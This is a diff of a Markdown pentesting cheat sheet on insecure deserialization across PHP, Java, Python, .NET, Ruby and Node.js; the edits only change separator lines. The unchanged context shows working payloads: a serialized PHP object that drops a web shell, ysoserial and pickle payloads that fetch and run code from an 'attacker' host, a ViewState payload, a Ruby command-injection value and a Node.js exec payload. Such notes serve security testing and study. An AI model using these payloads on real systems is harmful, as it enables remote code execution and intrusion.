@@ -17,7 +17,7 @@ linked:
 ---
 # Insecure Deserialization - Object Injection
 
-***
+---
 
 ## PHP
 
@@ -55,7 +55,7 @@ echo serialize($obj);
 // O:6:"Logger":2:{s:8:"log_file";s:23:"/var/www/html/sh.php";s:8:"log_data";s:15:"<?=`$_GET[c]`?>";}
 ```
 
-___
+---
 
 ## Java
 
@@ -89,7 +89,7 @@ java -jar ysoserial.jar CommonsCollections5 "curl http://attacker/x" \
 curl -X POST --data-binary "@<(base64 -d rce.b64)" https://target/api
 ```
 
-___
+---
 
 ## Python
 
@@ -119,7 +119,7 @@ print(payload)
 # gASVNAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1jdXJsIGh0dHA6Ly9hdHRhY2tlci94IHwgYmFzaJSFlFKULg==
 ```
 
-___
+---
 
 ## .NET
 
@@ -156,7 +156,7 @@ ysoserial.net.exe -p ViewState \
 curl -X POST -d "__VIEWSTATE=<payload>" https://target/page.aspx
 ```
 
-___
+---
 
 ## Ruby
 
@@ -188,7 +188,7 @@ filename: " | id"
 
 (Universal Ruby gadget — varía por versión.)
 
-___
+---
 
 ## Node.js
 
@@ -224,4 +224,4 @@ Para forzar ejecución, agregar `()` al final del IIFE:
 {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()"}
 ```
 
-***
+---
